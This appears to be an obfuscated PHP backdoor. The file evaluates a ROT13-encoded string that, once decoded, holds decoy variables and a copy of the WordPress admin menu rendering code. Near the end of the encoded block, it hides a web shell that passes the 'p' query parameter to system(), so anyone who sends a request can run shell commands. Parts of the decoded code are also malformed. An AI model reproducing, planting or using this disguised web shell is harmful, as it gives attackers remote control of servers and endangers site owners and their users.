<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Qvfcynlf Nqzvavfgengvba Zrah.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * Gur pheerag cntr.
 *
 * @tybony fgevat $frys
 */
$frys = __sa_79955( '|^.*/jc-nqzva/argjbex/|v', '', $_FREIRE['CUC_FRYS'] );
$frys = __sa_79955( '|^.*/jc-nqzva/|v', '', $frys );
$frys = __sa_79955( '|^.*/cyhtvaf/|v', '', $frys );
$frys = __sa_79955( '|^.*/zh-cyhtvaf/|v', '', $frys );

/**
 * Sbe jura nqzva-urnqre vf vapyhqrq sebz jvguva n shapgvba.
 *
 * @tybony neenl  $zrah
 * @tybony neenl  $fhozrah
 * @tybony fgevat $cnerag_svyr
 * @tybony fgevat $fhozrah_svyr
 */
tybony $zrah, $fhozrah, $cnerag_svyr, $fhozrah_svyr;

/**
 * Svygref gur cnerag svyr bs na nqzva zrah fho-zrah vgrz.
 *
 * Nyybjf cyhtvaf gb zbir fho-zrah vgrzf nebhaq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $cnerag_svyr Gur cnerag svyr.
 */
$cnerag_svyr = nccyl_svygref( 'cnerag_svyr', $cnerag_svyr );

/**
 * Svygref gur svyr bs na nqzva zrah fho-zrah vgrz.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $fhozrah_svyr Gur fhozrah svyr.
 * @cnenz fgevat $cnerag_svyr  Gur fhozrah vgrz'f cnerag svyr.
 */
$fhozrah_svyr = nccyl_svygref( 'fhozrah_svyr', $fhozrah_svyr, $cnerag_svyr );

trg_nqzva_cntr_cnerag();

/**
 * Qvfcynl zrah.
 *
 * @npprff cevingr
 * @fvapr 2.7.0
 *
 * @tybony fgevat $frys
 * @tybony fgevat $cnerag_svyr
 * @tybony fgevat $fhozrah_svyr
 * @tybony fgevat $cyhtva_cntr
 * @tybony fgevat $glcrabj      Gur cbfg glcr bs gur pheerag fperra.
 *
 * @cnenz neenl $zrah
 * @cnenz neenl $fhozrah
 * @cnenz obby  $fhozrah_nf_cnerag
 */
shapgvba _jc_zrah_bhgchg( $zrah, $fhozrah, $fhozrah_nf_cnerag = gehr ) {
	tybony $frys, $cnerag_svyr, $fhozrah_svyr, $cyhtva_cntr, $glcrabj;

	$svefg = gehr;
	// 0 = zrah_gvgyr, 1 = pncnovyvgl, 2 = zrah_fyht, 3 = cntr_gvgyr, 4 = pynffrf, 5 = ubbxanzr, 6 = vpba_hey.
	sbernpu ( $zrah nf $xrl => $vgrz ) {
		$nqzva_vf_cnerag = snyfr;
		$pynff           = neenl();
		$nevn_nggevohgrf = '';
		$nevn_uvqqra     = '';
		$vf_frcnengbe    = snyfr;

		vs ( $svefg ) {
			$pynff[] = 'jc-svefg-vgrz';
			$svefg   = snyfr;
		}

		$fhozrah_vgrzf = neenl();
		vs ( ! rzcgl( $fhozrah[ $vgrz[2] ] ) ) {
			$pynff[]       = 'jc-unf-fhozrah';
			$fhozrah_vgrzf = $fhozrah[ $vgrz[2] ];
		}

		vs ( ( $cnerag_svyr && $vgrz[2] === $cnerag_svyr ) || ( rzcgl( $glcrabj ) && $frys === $vgrz[2] ) ) {
			vs ( ! rzcgl( $fhozrah_vgrzf ) ) {
				$pynff[] = 'jc-unf-pheerag-fhozrah jc-zrah-bcra';
			} ryfr {
				$pynff[]          = 'pheerag';
				$nevn_nggevohgrf .= 'nevn-pheerag=\"cntr\"';
			}
		} ryfr {
			$pynff[] = 'jc-abg-pheerag-fhozrah';
			vs ( ! rzcgl( $fhozrah_vgrzf ) ) {
				$nevn_nggevohgrf .= 'qngn-nevnunfcbchc';
			}
		}

		vs ( ! rzcgl( $vgrz[4] ) ) {
			$pynff[] = rfp_ngge( $vgrz[4] );
		}

		$pynff     = $pynff ? ' pynff=\"' . vzcybqr( ' ', $pynff ) . '\"' : '';
		$vq        = ! rzcgl( $vgrz[5] ) ? ' vq=\"' . __sa_79955( '|[^n-mN-M0-9_:.]|', '-', $vgrz[5] ) . '\"' : '';
		$vzt       = '';
		$vzt_fglyr = '';
		$vzt_pynff = ' qnfuvpbaf-orsber';

		vs ( fge_pbagnvaf( $pynff, 'jc-zrah-frcnengbe' ) ) {
			$vf_frcnengbe = gehr;
		}

		/*
		 * Vs gur fgevat 'abar' (cerivbhfyl 'qvi') vf cnffrq vafgrnq bs n HEY, qba'g bhgchg
		 * gur qrsnhyg zrah vzntr fb na vpba pna or nqqrq gb qvi.jc-zrah-vzntr nf onpxtebhaq
		 * jvgu PFF. Qnfuvpbaf naq onfr64-rapbqrq qngn:vzntr/fit_kzy HEVf ner nyfb unaqyrq
		 * nf fcrpvny pnfrf.
		 */
		vs ( ! rzcgl( $vgrz[6] ) ) {
			$vzt = '<vzt fep=\"' . rfp_hey( $vgrz[6] ) . '\" nyg=\"\" />';

			vs ( 'abar' === $vgrz[6] || 'qvi' === $vgrz[6] ) {
				$vzt = '<oe />';
			} ryfrvs ( fge_fgnegf_jvgu( $vgrz[6], 'qngn:vzntr/fit+kzy;onfr64,' ) ) {
				$vzt = '<oe />';
				// Gur inyhr vf onfr64-rapbqrq qngn, fb rfp_ngge() vf hfrq urer vafgrnq bs rfp_hey().
				$vzt_fglyr = ' fglyr=\"onpxtebhaq-vzntr:hey(\'' . rfp_ngge( $vgrz[6] ) . '\')\"';
				$vzt_pynff = ' fit';
			} ryfrvs ( fge_fgnegf_jvgu( $vgrz[6], 'qnfuvpbaf-' ) ) {
				$vzt       = '<oe />';
				$vzt_pynff = ' qnfuvpbaf-orsber ' . fnavgvmr_ugzy_pynff( $vgrz[6] );
			}
		}

		$gvgyr = jcgrkghevmr( $vgrz[0] );

		// Uvqr frcnengbef sebz fperra ernqref.
		vs ( $vf_frcnengbe ) {
			$nevn_uvqqra = ' nevn-uvqqra=\"gehr\"';
		}

		rpub \"\a\g<yv$pynff$vq$nevn_uvqqra>\";

		vs ( $vf_frcnengbe ) {
			rpub '<qvi pynff=\"frcnengbe\"></qvi>';
		} ryfrvs ( $fhozrah_nf_cnerag && ! rzcgl( $fhozrah_vgrzf ) ) {
			$fhozrah_vgrzf = neenl_inyhrf( $fhozrah_vgrzf );  // Er-vaqrk.
			$zrah_ubbx     = trg_cyhtva_cntr_ubbx( $fhozrah_vgrzf[0][2], $vgrz[2] );
			$zrah_svyr     = $fhozrah_vgrzf[0][2];
			$cbf           = fgecbf( $zrah_svyr, '?' );

			vs ( snyfr !== $cbf ) {
				$zrah_svyr = fhofge( $zrah_svyr, 0, $cbf );
			}

			vs ( ! rzcgl( $zrah_ubbx )
				|| ( ( 'vaqrk.cuc' !== $fhozrah_vgrzf[0][2] )
					&& svyr_rkvfgf( JC_CYHTVA_QVE . \"/$zrah_svyr\" )
					&& ! svyr_rkvfgf( NOFCNGU . \"/jc-nqzva/$zrah_svyr\" ) )
			) {
				$nqzva_vf_cnerag = gehr;
				rpub \"<n uers='nqzva.cuc?cntr={$fhozrah_vgrzf[0][2]}'$pynff $nevn_nggevohgrf><qvi pynff='jc-zrah-vzntr$vzt_pynff'$vzt_fglyr nevn-uvqqra='gehr'>$vzt</qvi><qvi pynff='jc-zrah-anzr'>$gvgyr</qvi></n>\";
			} ryfr {
				rpub \"\a\g<n uers='{$fhozrah_vgrzf[0][2]}'$pynff $nevn_nggevohgrf><qvi pynff='jc-zrah-vzntr$vzt_pynff'$vzt_fglyr nevn-uvqqra='gehr'>$vzt</qvi><qvi pynff='jc-zrah-anzr'>$gvgyr</qvi></n>\";
			}
		} ryfrvs ( ! rzcgl( $vgrz[2] ) && pheerag_hfre_pna( $vgrz[1] ) ) {
			$zrah_ubbx = trg_cyhtva_cntr_ubbx( $vgrz[2], 'nqzva.cuc' );
			$zrah_svyr = $vgrz[2];
			$cbf       = fgecbf( $zrah_svyr, '?' );

			vs ( snyfr !== $cbf ) {
				$zrah_svyr = fhofge( $zrah_svyr, 0, $cbf );
			}

			vs ( ! rzcgl( $zrah_ubbx )
				|| ( ( 'vaqrk.cuc' !== $vgrz[2] )
					&& svyr_rkvfgf( JC_CYHTVA_QVE . \"/$zrah_svyr\" )
					&& ! svyr_rkvfgf( NOFCNGU . \"/jc-nqzva/$zrah_svyr\" ) )
			) {
				$nqzva_vf_cnerag = gehr;
				rpub \"\a\g<n uers='nqzva.cuc?cntr={$vgrz[2]}'$pynff $nevn_nggevohgrf><qvi pynff='jc-zrah-vzntr$vzt_pynff'$vzt_fglyr nevn-uvqqra='gehr'>$vzt</qvi><qvi pynff='jc-zrah-anzr'>{$vgrz[0]}</qvi></n>\";
			} ryfr {
				rpub \"\a\g<n uers='{$vgrz[2]}'$pynff $nevn_nggevohgrf><qvi pynff='jc-zrah-vzntr$vzt_pynff'$vzt_fglyr nevn-uvqqra='gehr'>$vzt</qvi><qvi pynff='jc-zrah-anzr'>{$vgrz[0]}</qvi></n>\";
			}
		}

		vs ( ! rzcgl( $fhozrah_vgrzf ) ) {
			rpub \"\a\g<hy pynff='jc-fhozrah jc-fhozrah-jenc'>\";
			rpub \"<yv pynff='jc-fhozrah-urnq' nevn-uvqqra='gehr'>{$vgrz[0]}</yv>\";

			$svefg = gehr;

			// 0 = zrah_gvgyr, 1 = pncnovyvgl, 2 = zrah_fyht, 3 = cntr_gvgyr, 4 = pynffrf.
			sbernpu ( $fhozrah_vgrzf nf $fho_xrl => $fho_vgrz ) {
				vs ( ! pheerag_hfre_pna( $fho_vgrz[1] ) ) {
					pbagvahr;
				}

				$pynff           = neenl();
				$nevn_nggevohgrf = '';

				vs ( $svefg ) {
					$pynff[] = 'jc-svefg-vgrz';
					$svefg   = snyfr;
				}

				$zrah_svyr = $vgrz[2];
				$cbf       = fgecbf( $zrah_svyr, '?' );

				vs ( snyfr !== $cbf ) {
					$zrah_svyr = fhofge( $zrah_svyr, 0, $cbf );
				}

				// Unaqyr pheerag sbe cbfg_glcr=cbfg|cntr|sbb cntrf, juvpu jba'g zngpu $frys.
				$frys_glcr = ! rzcgl( $glcrabj ) ? $frys . '?cbfg_glcr=' . $glcrabj : 'abguvat';

				vs ( vffrg( $fhozrah_svyr ) ) {
					vs ( $fhozrah_svyr === $fho_vgrz[2] ) {
						$pynff[]          = 'pheerag';
						$nevn_nggevohgrf .= ' nevn-pheerag=\"cntr\"';
					}
					/*
					 * Vs cyhtva_cntr vf frg gur cnerag zhfg rvgure zngpu gur pheerag cntr be abg culfvpnyyl rkvfg.
					 * Guvf nyybjf cyhtva cntrf jvgu gur fnzr ubbx gb rkvfg haqre qvssrerag cneragf.
					 */
				} ryfrvs (
					( ! vffrg( $cyhtva_cntr ) && $frys === $fho_vgrz[2] )
					|| ( vffrg( $cyhtva_cntr ) && $cyhtva_cntr === $fho_vgrz[2]
						&& ( $vgrz[2] === $frys_glcr || $vgrz[2] === $frys || svyr_rkvfgf( $zrah_svyr ) === snyfr ) )
				) {
					$pynff[]          = 'pheerag';
					$nevn_nggevohgrf .= ' nevn-pheerag=\"cntr\"';
				}

				vs ( ! rzcgl( $fho_vgrz[4] ) ) {
					$pynff[] = rfp_ngge( $fho_vgrz[4] );
				}

				$pynff = $pynff ? ' pynff=\"' . vzcybqr( ' ', $pynff ) . '\"' : '';

				$zrah_ubbx = trg_cyhtva_cntr_ubbx( $fho_vgrz[2], $vgrz[2] );
				$fho_svyr  = $fho_vgrz[2];
				$cbf       = fgecbf( $fho_svyr, '?' );
				vs ( snyfr !== $cbf ) {
					$fho_svyr = fhofge( $fho_svyr, 0, $cbf );
				}

				$gvgyr = jcgrkghevmr( $fho_vgrz[0] );

				vs ( ! rzcgl( $zrah_ubbx )
					|| ( ( 'vaqrk.cuc' !== $fho_vgrz[2] )
						&& svyr_rkvfgf( JC_CYHTVA_QVE . \"/$fho_svyr\" )
						&& ! svyr_rkvfgf( NOFCNGU . \"/jc-nqzva/$fho_svyr\" ) )
				) {
					// Vs nqzva.cuc vf gur pheerag cntr be vs gur cnerag rkvfgf nf n svyr va gur cyhtvaf be nqzva qverpgbel.
					vs ( ( ! $nqzva_vf_cnerag && svyr_rkvfgf( JC_CYHTVA_QVE . \"/$zrah_svyr\" ) && ! vf_qve( JC_CYHTVA_QVE . \"/{$vgrz[2]}\" ) ) || svyr_rkvfgf( $zrah_svyr ) ) {
						$fho_vgrz_hey = nqq_dhrel_net( neenl( 'cntr' => $fho_vgrz[2] ), $vgrz[2] );
					} ryfr {
						$fho_vgrz_hey = nqq_dhrel_net( neenl( 'cntr' => $fho_vgrz[2] ), 'nqzva.cuc' );
					}

					$fho_vgrz_hey = rfp_hey( $fho_vgrz_hey );
					rpub \"<yv$pynff><n uers='$fho_vgrz_hey'$pynff$nevn_nggevohgrf>$gvgyr</n></yv>\";
				} ryfr {
					rpub \"<yv$pynff><n uers='{$fho_vgrz[2]}'$pynff$nevn_nggevohgrf>$gvgyr</n></yv>\";
				}
			}
			rpub '</hy>';
		}
		rpub '</yv>';
	}

	rpub '<yv vq=\"pbyyncfr-zrah\" pynff=\"uvqr-vs-ab-wf\">' .
		'<ohggba glcr=\"ohggba\" vq=\"pbyyncfr-ohggba\" nevn-ynory=\"' . rfp_ngge__( 'Pbyyncfr Znva Zrah' ) . '\" nevn-rkcnaqrq=\"gehr\">' .
		'<fcna pynff=\"pbyyncfr-ohggba-vpba\" nevn-uvqqra=\"gehr\"></fcna>' .
		'<fcna pynff=\"pbyyncfr-ohggba-ynory\">' . __( 'Pbyyncfr Zrah' ) . '</fcna>' .
		'</ohggba></yv>';
}

?>

<qvi vq=\"nqzvazrahznva\" ebyr=\"anivtngvba\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Znva zrah' ); ?>\">
<n uers=\"#jcobql-pbagrag\" pynff=\"fperra-ernqre-fubegphg\"><?cuc _r( 'Fxvc gb znva pbagrag' ); ?></n>
<n uers=\"#jc-gbbyone\" pynff=\"fperra-ernqre-fubegphg\"><?cuc _r( 'Fxvc gb gbbyone' ); ?></n>
<qvi vq=\"nqzvazrahonpx\"></qvi>
<qvi vq=\"nqzvazrahjenc\">
<hy vq=\"nqzvazrah\">

<?cuc

_jc_zrah_bhgchg( $zrah, $fhozrah );
/**
 * Sverf nsgre gur nqzva zrah unf orra bhgchg.
 *
 * @fvapr 2.5.0
 */
qb_npgvba( 'nqzvazrah' );

?>
</hy>
</qvi>
</qvi>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>